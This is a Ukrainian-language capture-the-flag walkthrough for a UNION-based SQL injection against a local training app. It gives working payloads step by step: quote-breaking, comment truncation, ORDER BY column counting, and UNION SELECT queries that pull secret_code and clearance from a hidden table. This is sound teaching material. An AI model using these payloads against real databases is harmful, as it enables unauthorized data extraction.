# Врайтап: SQL Injection (UNION-Based)

## 1) Рекогносцировка
Відкрий сторінку задачі (локально за compose це зазвичай http://localhost:8080/).
Зверни увагу на блоки:
* **SQL preview** зверху (показує, що саме “збирається”).
* **Executed SQL (debug)** в результатах (показує реальний SQL з сервера).
* **Raw JSON** (там з’явиться `FLAG{...}`, коли витягнеш його).

## 2) Підтвердження ін’єкції (перевірка одинарною лапкою)
У поле “Повне ім’я” введи один символ:
`'`

Натисни Search.
Має бути **SQL ERROR** (типова помилка через “поламану” строку). Це означає, що лапка з вводу реально ламає SQL.

## 3) Навчитися “глушити” хвіст запиту коментарем
Тобі треба прибрати останню `'`, яку бекенд дописує після вводу. Для цього використовуй `--` (SQL-коментар).

Введи:
`'--`

Якщо Postgres вимагатиме пробіл після коментаря, введи так:
`'-- `

## 4) Знайти кількість колонок (щоб зробити UNION)
У запиті вибирається 4 колонки (`id`, `full_name`, `position`, `security_stars`). Це можна довести через `ORDER BY`.

Введи:
`' ORDER BY 4-- `

Якщо помилки нема, значить колонок мінімум 4.

Далі:
`' ORDER BY 5-- `

Це має дати помилку (колонки 5 нема) → значить рівно 4.

## 5) UNION-ін’єкція, щоб прочитати STAFF_Command
Тепер робимо `UNION SELECT` з 4 полями, де у друге поле (`full_name`) підставляємо `secret_code`.

Введи ось такий payload:
`' UNION SELECT 1337, secret_code, 'exfil', '***' FROM STAFF_Command-- `

Що відбудеться:
* перша частина стане `full_name = ''` (нічого не знайде в `STAFF_all`),
* друга частина додасть рядок з `STAFF_Command.secret_code`,
* у таблиці результатів ти побачиш `FLAG{...}` (в колонці Full Name),
* статус зверху зміниться на MISSION ACCOMPLISHED (бо JSON міститиме `FLAG{`).

## 6) Якщо хочеш витягнути ще й clearance (опціонально)
Можеш підставити `clearance` у “Position / Rank”, щоб бачити обидва поля:
`' UNION SELECT 1337, secret_code, clearance, '***' FROM STAFF_Command-- `
